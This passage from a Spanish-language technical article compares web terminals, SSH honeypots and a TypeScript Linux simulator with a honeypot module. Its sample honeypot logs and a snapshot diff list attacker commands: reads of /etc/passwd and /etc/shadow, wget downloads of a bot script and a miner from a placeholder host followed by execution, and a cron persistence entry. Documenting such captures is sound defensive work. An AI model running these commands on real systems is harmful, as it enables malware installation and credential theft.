xterm.js es solo la capa de renderizado. No ejecuta un shell. No interpreta comandos. Es un widget de visualización que conectas al backend que quieras. Mucha gente piensa que xterm.js «hace la terminal» pero en realidad es solo la pantalla -- todavía necesitas conectarlo a algo que realmente ejecute comandos.

**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)  
**GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` -- Spawning de PTY

`node-pty` crea un pseudoterminal (PTY) en Node.js y te da un manejador de lectura/escritura para él. Usado con xterm.js, te permite construir una terminal de navegador que se comunica con un shell real (bash, zsh, fish) ejecutándose en el servidor.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // Enviar al xterm.js del navegador vía WebSocket
  ws.send(data);
});

ws.on("message", data => {
  // Reenviar pulsaciones del navegador al shell
  shell.write(data);
});
```

Este es el patrón estándar para IDEs en la nube y terminales web: xterm.js (navegador) ↔ WebSocket ↔ node-pty ↔ bash real. Sin aislamiento. El shell se ejecuta con todos los permisos del proceso Node.js (o del usuario que lo ejecuta).

**Mantenido por**: Microsoft.  
**npm**: [node-pty](https://www.npmjs.com/package/node-pty)  
**GitHub**: [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Parte 4 -- Honeypots SSH

Los honeypots están diseñados para ser atacados. El objetivo es parecer lo suficientemente reales como para que los atacantes interactúen con ellos, mientras registran todo lo que hacen para inteligencia de amenazas. SSH es el objetivo principal porque es el servicio más atacado en internet -- si expones el puerto 22 en una IP pública, verás intentos de escaneo automatizados en cuestión de minutos. Pruébalo alguna vez, es bastante horrorizante lo rápido que sucede.

La calidad de un honeypot se mide por dos cosas: **fidelidad** (cuán convincentemente se hace pasar por un sistema real) y **telemetría** (cuántos datos útiles captura). Estas están en tensión. Un honeypot de alta fidelidad es más difícil de construir y más riesgoso de operar.

Esta sección es lo que eventualmente me llevó a construir el módulo `HoneyPot` en `typescript-virtual-container`, así que tengo algunas opiniones aquí.

### 4.1 Cowrie -- el estándar de oro

Cowrie es un honeypot SSH y Telnet de interacción media-alta basado en Python. Es el honeypot SSH más ampliamente desplegado en la comunidad de investigación y seguridad.

Arquitectura:
- **Capa de protocolo**: implementación real del protocolo SSH (Twisted Conch), así que los atacantes obtienen handshakes reales, intercambio de claves real, autenticación real
- **Capa de shell**: un sistema de archivos falso (parecido a Debian 5.0) y un intérprete de shell parcial que responde a comandos comunes
- **Modo proxy**: puede reenviar a un sistema real detrás (modo de alta interacción), registrando todo lo que fluye a través
- **Modo LLM** (adición reciente): usa un modelo de lenguaje para generar respuestas dinámicas a comandos que no sabe manejar -- sí, Cowrie ahora tiene modo IA. Tiempos locos.

```python
# Lo que Cowrie captura
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie guarda los archivos descargados (vía wget/curl/SFTP/SCP) para análisis de malware. Se integra con Splunk, Elasticsearch y otras plataformas SIEM.

**Fidelidad**: media-alta. Suficientemente convincente para engañar a bots automatizados (que es el 99% de los atacantes SSH -- la mayoría son solo scripts tontos probando `root`/`password`). Humanos sofisticados pueden detectarlo, aunque normalmente bastante rápido.

**Lenguaje**: Python (Twisted)  
**GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo -- el predecesor de Cowrie

Kippo es el honeypot SSH de interacción media original en el que se basó Cowrie. Misma idea básica: protocolo SSH real, sistema de archivos falso, shell parcial. Cowrie lo ha suplantado completamente a estas alturas -- Kippo está archivado y nadie debería ejecutarlo en 2026. Mencionado aquí puramente por integridad histórica, ya que podrías verlo referenciado en artículos de blog antiguos y documentos de seguridad.

**GitHub**: [desaster/kippo](https://github.com/desaster/kippo) -- archivado

---

### 4.3 endlessh -- el tarpit SSH

endlessh es un honeypot degenerado: mantiene las conexiones SSH abiertas goteando lentamente datos del banner a 1 byte por segundo (o más lento). Un cliente SSH que se conecte a él colgará indefinidamente -- nunca llegará a la autenticación porque el servidor nunca termina de enviar el banner.

El objetivo no es inteligencia de amenazas sino denegación de recursos pura: ocupar los hilos de escaneo del atacante para que no puedan alcanzar objetivos reales tan rápido. Es honestamente un poco malvado de la mejor manera. No estás aprendiendo nada del atacante -- solo estás perdiendo su tiempo. Hay algo profundamente satisfactorio en eso.

```c
// Todo el comportamiento del protocolo de endlessh:
// Enviar: "SSH-2.0-OpenSSH_" luego agregar caracteres aleatorios lentamente
// Nunca cerrar la conexión
// El escáner del atacante agota el tiempo después de N segundos
```

No se capturan comandos. No se prueba autenticación. Solo tiempo de conexión.

**Escrito en**: C  
**GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame -- el honeypot «deja entrar a todos»

sshesame acepta cada conexión SSH (cualquier usuario, cualquier contraseña, cualquier clave) y registra todo. Es un honeypot de interacción cero: no responde a comandos, solo deja «entrar» a los atacantes y registra cada pulsación que escriben.

```
2024-01-15 03:22:11 Connection from 45.33.32.156
  Username: root, Password: password123 -- accepted
  Commands typed:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Disconnected after 47s
```

Útil para recolección de credenciales: acumulas rápidamente los nombres de usuario y contraseñas que los bots prueban, lo que te dice qué credenciales predeterminadas están siendo brutalmente forzadas actualmente. Spoiler: siempre es `root`/`password`, `admin`/`admin` y `root`/`123456`. Siempre.

**GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird -- framework de honeypots basado en Docker

`lyrebird/honeypot-base` es una imagen base Docker para construir honeypots de servicios de red. No es específicamente un honeypot SSH -- es un framework para construir honeypots de cualquier protocolo.

La imagen base proporciona un framework de registro, un sistema de plugins para protocolos y configuraciones de Docker Compose para honeypots multi-servicio. Lo extiendes para falsear servicios específicos.

**Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Construir un honeypot SSH en Node.js -- la forma ingenua, y por qué falla

Antes de `typescript-virtual-container`, construir un honeypot SSH en Node.js significaba combinar la librería real `ssh2` con falsificación manual de comandos. Muy tedioso, muy incompleto, pero como... es un rito de iniciación a estas alturas:

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Registrar el intento
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Dejar entrar a todos
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Respuesta falsa
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

Esto «funciona» en el sentido de que captura credenciales y comandos. Pero es obviamente falso en cuanto un atacante sofisticado lo prueba. `uname -a` devuelve la cadena correcta pero `ls /etc` devuelve «command not found» es una pista evidente. El sistema de archivos no existe. Los comandos no se encadenan. Los pipes no funcionan. Las variables no se expanden.

Un atacante hábil detectará tu honeypot en los primeros cinco comandos. Los scripts automatizados que verifican el comportamiento tipo Cowrie también lo detectarán inmediatamente. Esto es aparentemente lo que empujó a la autora de `typescript-virtual-container` a construir algo que realmente interpreta comandos de verdad -- más sobre eso en la Parte 5.

---

### Resumen de la familia de honeypots

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | ssh2 ingenuo |
|---|---|---|---|---|---|---|
| **Nivel de interacción** | medio-alto | medio | cero | cero | varía | bajo |
| **Protocolo SSH real** | ✅ | ✅ | ❌ (tarpit) | ✅ | varía | ✅ |
| **Fidelidad de shell** | media | media | n/a | ninguna | varía | mínima |
| **Captura credenciales** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Captura comandos** | ✅ | ✅ | ❌ | ✅ | varía | ✅ |
| **Captura malware** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **Integración SIEM** | ✅ nativa | ❌ | ❌ | ❌ | ❌ | manual |
| **Respuestas LLM** | ✅ (nuevo) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Lenguaje** | Python | Python | C | Go | Docker | Node.js |
| **Node.js nativo** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Estado** | ✅ muy activo | ⚠️ archivado | ✅ activo | ✅ activo | ✅ activo | DIY |

El patrón aquí es bastante claro: cuanto más fidelidad quieras, más Python tienes que escribir. Cowrie es el claro ganador si haces esto en serio -- ha sido probado en batalla durante años y captura mucho más que solo credenciales. endlessh y sshesame son proyectos divertidos más que herramientas serias de inteligencia de amenazas. Y el enfoque ingenuo de Node.js te lleva quizás el 20% del camino antes de que encuentres un muro.

---

## Parte 5 -- `typescript-virtual-container`: lo que llena el vacío

Bien, aquí es donde las cosas se ponen interesantes. Después de catalogar todas las familias anteriores, el cuadrante faltante se vuelve bastante obvio:

- Sandboxes JS: aíslan código, sin shell, sin sistema de archivos, sin SSH
- Emuladores de Linux: SO real, shell real, SSH real... pero 150+ MB de RAM, arranque de 30 segundos, y necesitas construir tu propia API sobre E/S serie
- Honeypots: shell falso, sin API programática, Python/Go/C, no nativos de Node

Nadie había construido un entorno Linux completo, programático y nativo de Node con SSH real, permisos reales, redes virtuales reales y una API TypeScript tipada. Así que ella lo construyó.

Presentación rápida ya que es la primera vez que la menciono adecuadamente: `typescript-virtual-container` fue construido por [Chloé Rolzhausen](https://itsrealfortune.fr), una desarrolladora francesa que usa el nombre **Fortune** (o ItsRealFortune) en línea. Puedes encontrarla en su [sitio web](https://itsrealfortune.fr) y en [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316//). Todo el proyecto -- 56k líneas de TypeScript, 247 archivos, 170 comandos -- fue un esfuerzo en solitario de una persona. La llamaré Fortune por el resto del artículo. Y sí, es bastante loco. ¡Ve a ver su trabajo!

### Lo que realmente es

`typescript-virtual-container` es un **simulador de entorno Linux** escrito en TypeScript puro. Sin Wasm. Sin addons nativos. Sin kernel. ~56,000 líneas de código fuente en 247 archivos TypeScript.

La idea clave: no necesitas un emulador de CPU para hacer que `ls /etc | grep passwd` funcione. Necesitas:
1. Un árbol de nodos en memoria que responda a operaciones de ruta
2. Un modelo de permisos POSIX aplicado en cada acceso
3. Un parser de shell que entienda pipelines, redirecciones, sub-shells y expansión de variables
4. ~170 implementaciones de comandos (funciones, no binarios)
5. Un sistema de gestión de usuarios y grupos
6. Algo para exponer todo esto sobre SSH

Todo eso es alcanzable en TypeScript puro sin involucrar un kernel.

### El VirtualFileSystem

El VFS es un árbol en memoria de nodos tipados -- sin E/S de disco a menos que habilites explícitamente el modo de persistencia `"fs"`:

```ts
// Representación interna simplificada
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // placeholder de carga diferida
```

Cada operación de ruta pasa por `normalizePath` (resuelve `.`, `..`, symlinks) y `enforceAccess` (verifica permisos de lectura/escritura/ejecución contra el uid/gid solicitante). `chmod`, `chown`, sticky bits y setuid están todos implementados y realmente se aplican. Si un proceso ejecutándose como uid 1000 intenta leer un archivo propiedad de root con modo 0600, obtiene EACCES -- no un EACCES falso, un `Error` real de JavaScript lanzado desde la verificación de permisos. Esa parte es bastante elegante, honestamente.

El VFS se serializa a:
- `.vfsb` -- un formato binario compacto (personalizado, con compresión fflate) -- este es el predeterminado
- Snapshot JSON -- legible por humanos, bueno para depuración
- Archivo TAR -- importación/exportación con formato tar real, así que puedes hacer `tar -xf` algo y el VFS simplemente... tiene esos archivos
- Imagen SquashFS -- importación de solo lectura

En el modo de persistencia `"fs"`, mantiene un diario de escritura anticipada (WAL) para recuperación ante caídas -- las escrituras van primero al diario, luego al snapshot al vaciar. Si Node se cae en medio de una operación, el diario te permite reconstruir el último estado completo.

También hay una capa `FileCache` que simula latencia de E/S de disco. Configuras perfiles como `NVME_DISK_IO` o `HDD_DISK_IO` y el VFS retrasa artificialmente las operaciones de archivo para coincidir con tiempos realistas. Lo cual es bastante gracioso -- software ralentizándose intencionalmente para simular hardware -- pero en realidad muy útil para benchmarking.

### El intérprete de shell

El parser de shell produce un AST tipado:

```ts
// "ls /etc | grep root && echo done" se parsea a:
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

El ejecutor recorre este AST:
- Para un pipeline, crea una cadena de flujos `{ stdin, stdout, stderr }` y ejecuta cada comando con E/S canalizada
- Para operadores lógicos (`&&`, `||`), verifica `$?` después del lado izquierdo antes de ejecutar el derecho
- Para sub-shells (`$(...)`, `` ` ` ``), bifurca el contexto de ejecución
- Para redirecciones (`>file`, `>>file`, `2>&1`, `<file`), configura el cableado de flujos antes de la ejecución
- Para trabajos en segundo plano (`cmd &`), se ejecuta sin esperar la finalización
- Para variables, expande `$VAR`, `${VAR:-default}`, `${#VAR}`, y aritmética `$((expr))`
- Para expansión de llaves (`{a,b,c}`, `{1..5}`), genera la lista de expansión completa antes de ejecutar

Todo esto es comportamiento real de shell POSIX. El parser maneja heredocs, sustitución de procesos, globbing (`*`, `?`, `[abc]`), y manejo de comillas (comillas simples, comillas dobles con interpolación, escape con barra invertida). No es perfecto -- existen casos límite -- pero está mucho más allá de lo que esperarías de un proyecto TypeScript.

### ~170 comandos integrados

Los comandos son funciones TypeScript registradas en un registro de comandos. Reciben un `CommandContext` con flujos stdin/stdout/stderr, el VFS, la sesión de usuario, el entorno del shell y acceso a submódulos.

Escribir 170 implementaciones de comandos Unix es... mucho. Algunos son triviales (`echo`, `true`, `false`), algunos son sorprendentemente complejos (`awk`, `find`, `tar`). Como, ¿`awk` POSIX completo? ¿En TypeScript? Eso es una locura honestamente. Aquí hay una muestra de lo que hay:

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (lado cliente, conexión saliente),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (editor interactivo completo), vim (básico), vi (básico),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (simulado), systemctl (stub), journalctl (stub),
...y ~130 más
```

Los «stubs» (git, python3, node) responden de manera realista a invocaciones comunes -- `python3 --version` devuelve una cadena de versión creíble, `git status` muestra un estado de repo falso -- sin hacer trabajo real. Para un honeypot, estos son en realidad más útiles que los reales, porque te permiten observar lo que los atacantes intentan ejecutar sin ejecutar realmente nada dañino.

### El servidor SSH

La capa SSH usa el paquete npm real `ssh2` -- protocolo SSH real, intercambio de claves real, cifrado real. `SSHMimic` lo envuelve:

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// SSH real: ssh -p 2222 root@localhost
// SFTP real: sftp -P 2222 root@localhost
// SCP real: scp -P 2222 file root@localhost:/tmp/
```

Las `shellProperties` determinan lo que `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version` y `/etc/os-release` reportan. Puedes impersonar cualquier distribución de Linux y versión de kernel de manera convincente -- para un cliente SSH real no hay literalmente forma de notar la diferencia.

### El módulo HoneyPot

Como el intérprete de shell es real y el servidor SSH es real, los comandos del atacante realmente se ejecutan en el entorno virtual. Las solicitudes `wget` iniciadas por atacantes se registran con las URLs de destino. Los archivos creados por atacantes se guardan en el VFS. Los intentos de escalada de privilegios producen errores realistas.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// Después de una sesión, diferencias el sistema de archivos
const before = shell.vfs.toSnapshot();
// ... sesión del atacante ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Esto es cualitativamente diferente de Cowrie. El sistema de archivos falso de Cowrie puede responder a `ls` pero no puede rastrear realmente qué archivos creó un atacante y qué cambios hicieron como un diff estructurado. `typescript-virtual-container` puede, porque el VFS es una estructura de datos viva -- cada escritura se rastrea. ¿Esa entrada de cron que el atacante acaba de añadir? Está en el diff. ¿Esa carpeta `.hidden`? En el diff. Bastante útil para análisis de malware.

### El stack de red virtual

Esta es probablemente la parte más impresionante de todo el proyecto, y no tiene equivalente en ningún otro proyecto en este espacio. Como, un stack de red virtual L2/L3 completo con soporte VPN, escrito en TypeScript puro, sin adaptadores de red reales involucrados. Eso es genuinamente salvaje.

`VirtualNetworkManager` le da a cada instancia de `VirtualShell` interfaces de red virtuales con direcciones IP configurables, tablas de enrutamiento y un firewall de software (reglas estilo iptables con conntrack y NAT). `ip addr`, `ip route`, `iptables -L`, `netstat -rn` todos muestran el estado de la red virtual.

`VirtualSwitch` (llamado Baie -- de la palabra francesa para rack de servidor, «baie informatique») conecta múltiples shells en una subred compartida. Implementa:
- Aprendizaje MAC y ARP
- Enrutamiento IP entre subredes
- NAT (masquerade de salida)
- DNS (registros configurables por subred)
- Balanceo de carga (round-robin, least-connections)
- Modelado de tráfico: latencia, jitter (distribución gaussiana), pérdida de paquetes, pérdida por ráfagas, reordenamiento, duplicación
- Límite de ancho de banda (token bucket)
- Cumplimiento de MTU
- Seguimiento de conexiones (stateful, con estados NEW/ESTABLISHED/TIME_WAIT)

```ts
const baie = new Baie("192.168.0.0/24");

// Tres máquinas virtuales en el mismo switch
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Firewall: web puede alcanzar api, api puede alcanzar db, web no puede alcanzar db directamente
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Modelado de tráfico: simular un enlace WAN inestable hacia el exterior
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` crea túneles cifrados entre instancias de Baie -- puedes simular una red multi-sitio con interconexiones VPN entre sitios.

`VirtualProxy` implementa reenvío de puertos y un proxy SOCKS5.

Nada de esto toca un adaptador de red real. Es todo enrutamiento de objetos TypeScript. El comando `ping» funciona» enrutando a través del switch virtual y devolviendo respuestas ICMP simuladas. `curl http://192.168.0.3/api` enruta a través de la red virtual, golpea la respuesta HTTP simulada del shell api y devuelve el contenido. Son tortugas todo el camino hacia abajo, de la mejor manera posible.

### El `SandboxedShell`

Para uso programático donde necesitas un aislamiento más fuerte, `SandboxedShell` ejecuta una sesión de shell en un Worker thread de Node.js:

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% de un núcleo
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

El aislamiento aquí se aplica mediante la capa VFS (el shell del worker thread solo puede ver el sistema de archivos virtual, nunca el sistema de archivos anfitrión) más el aislamiento de memoria del Worker thread de Node.js. Esto es más ligero que `isolated-vm` pero más apropiado para aislamiento a nivel de shell en lugar de aislamiento a nivel de JS.

### Límites de recursos

Puedes configurar límites de recursos por shell que afectan lo que los comandos de monitoreo del sistema reportan:

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

Dentro de ese shell, `free -m` muestra 512 MB de RAM total. `nproc` devuelve 2. `/proc/meminfo` muestra los valores limitados. `htop` y `top` muestran el recuento de CPU limitado. Esto te permite ajustar el perfil de hardware de la máquina falsa precisamente.

### Tres modos de despliegue

```
Modo 1: Servidor SSH/SFTP
  VirtualSshServer / VirtualSftpServer
  → Protocolo SSH real, SFTP real, SCP real
  → Caso de uso: honeypots, entornos de prueba remotos, laboratorios de entrenamiento

Modo 2: Web shell (navegador)
  builds/fortune-nyx-v1.7.6-web.min.js (bundle ESM)
  → Se ejecuta en el navegador, VFS persistido en IndexedDB
  → Caso de uso: tutoriales interactivos, terminales embebidas, demos
  → Extra: ejecuta startxfce4 para un escritorio XFCE simulado completo

Modo 3: CLI independiente
  builds/fortune-nyx-v1.7.6-directbash-k6.1.0.mjs (archivo único, sin instalación)
  → curl y ejecutar, persiste VFS en directorio .vfs/
  → Caso de uso: demos rápidas, experimentación local
```

### Los polyfills -- cómo el build de navegador funciona sin Wasm

OK, esta es la parte que encuentro genuinamente inteligente y quería destacar específicamente.

Hacer que una librería de Node.js funcione en el navegador es normalmente una pesadilla. O usas un runtime Wasm (pesado, lento de cargar) o pasas semanas reemplazando manualmente cada importación `node:*` con una alternativa compatible con navegadores. Fortune hizo la segunda opción -- pero muy limpiamente, escribiendo un conjunto de polyfills personalizados que viven en el directorio `polyfills/` del repositorio.

El pipeline de build es solo esbuild con un montón de entradas `alias`:

```js
// demo/build.js -- toda la configuración del build de navegador
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Sin Wasm. Sin librería de polyfills externa. Sin tonterías de `webpack-node-externals`. Solo módulos con alias y un par de globales inyectados. Déjame explicar cada uno porque algunos son genuinamente impresionantes.

**`node:fs` -- IndexedDB como sistema de archivos falso**

Este es mi favorito. El polyfill de `node:fs` implementa la API síncrona de Node.js fs (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) respaldada por dos capas: un `Map` en memoria para lecturas síncronas, e IndexedDB para persistencia entre recargas de página. Las escrituras golpean el Map inmediatamente (así que `readFileSync` justo después de `writeFileSync` siempre funciona), luego se vacían a IndexedDB asíncronamente en segundo plano.

```js
// Sync cache (path → Uint8Array | null) -- lecturas instantáneas
const memCache = new Map();

// Precargar todo desde IndexedDB a memCache al inicio
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

Esta es la razón por la que el snapshot del VFS sobrevive a recargas de página en el navegador -- todo el binario `.vfsb` se escribe en IndexedDB a través de este polyfill, y se lee de vuelta en la siguiente carga. Sin Wasm. Sin servidor. Solo IndexedDB, que ha estado en todos los navegadores desde como 2011.

**`node:crypto` -- SHA-256 en JS puro**

En lugar de usar una librería criptográfica Wasm, el polyfill de crypto implementa SHA-256 desde cero usando las constantes de ronda FIPS 180-4. 166 líneas de JS puro con soporte completo de salida hex/base64/Uint8Array. Todo el hash en la librería pasa por esto -- huellas digitales de claves de host SSH, sumas de verificación internas, todo. Compacto, cero dependencias, simplemente funciona.

**`node:os` -- lee el hardware real del navegador**

Este es un buen detalle. En lugar de devolver valores de marcador de posición fijos, `node:os` lee `navigator.deviceMemory` para la RAM total y `navigator.hardwareConcurrency` para el recuento de CPU. Así que `neofetch` dentro del build de navegador realmente reporta algo que corresponde a tu máquina real -- no un stub inventado de `2 cores, 2GB RAM`.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 GB fallback
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // también parsea navigator.userAgent para adivinar el modelo de CPU
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify` -- stubs honestos**

El navegador no puede abrir sockets TCP ni ejecutar SSH real, así que estos son stubs que lanzan un error `NotImplemented` con un mensaje claro si algo intenta usarlos. Sin fallo silencioso, sin devolver `undefined` donde se espera un objeto. Solo un fuerte y claro «esto no funciona en el navegador» -- que es exactamente lo que quieres.

**`process.js` y `buffer.js` -- globales inyectados**

Estos dos se inyectan al principio de cada archivo empaquetado mediante la opción `inject` de esbuild, así que `process` y `Buffer` están disponibles globalmente sin necesidad de importación explícita. `process.js` es pequeño: `env`, `version`, `platform: 'browser'`, `nextTick` via `queueMicrotask`, `uptime` via `performance.now()`. `buffer.js` es una reimplementación completa de `Buffer` sobre `Uint8Array` -- todos los métodos `readUInt32BE`, `writeInt16LE`, codificación hex/base64 de los que dependen la implementación SSH y el VFS.

---

Todo el conjunto de polyfills tiene aproximadamente 640 líneas de JS escrito a mano en total. Sin paquetes npm. Sin Wasm. Y el resultado es un bundle de navegador que es solo la librería, ejecutándose de forma nativa, sin ninguna de las ansiedades habituales de «¿pero realmente funciona en el navegador?» que tienes con las librerías hechas primero para Node. Vale la pena echar un vistazo a la carpeta `polyfills/` en el repositorio si tienes curiosidad -- cada archivo está bien contenido y es legible por sí mismo, que es una elección de estilo que aprecio mucho.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Categoría** | Sandbox JS | Sandbox JS | Sandbox JS | Emulador | Emulador | Node.js/Wasm | Honeypot | Simulador |
| **Aísla JS** | ⚠️ ámbito | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | parcial | n/a | ✅ Worker |
| **Kernel Linux real** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Intérprete de shell** | ❌ | ❌ | ❌ | ✅ (real) | ✅ (real) | ✅ (real) | parcial | ✅ (personalizado) |
| **~170 comandos Unix** | ❌ | ❌ | ❌ | ✅ | ✅ | parcial | ~20 | ✅ |
| **Permisos POSIX** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | parcial | ✅ aplicados |
| **Gestión de usuarios** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | mínimo | ✅ completo |
| **Servidor SSH real** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/auditoría** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **Diff/snapshot VFS** | ❌ | ❌ | ❌ | limitado | ❌ | ❌ | ❌ | ✅ |
| **Red virtual L2/L3** | ❌ | ❌ | ❌ | básico | ❌ | ❌ | ❌ | ✅ completo |
| **VPN virtual** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Soporte navegador** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js nativo** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **API tipada** | básica | ✅ | ✅ | mínima | ❌ | ✅ | ❌ | ✅ completa |
| **Compatibilidad binaria** | n/a | n/a | n/a | ✅ | ✅ | parcial | n/a | ❌ |
| **Tiempo arranque** | instantáneo | instantáneo | instantáneo | 15–40s | 15–40s | 2–5s | instantáneo | <1s |
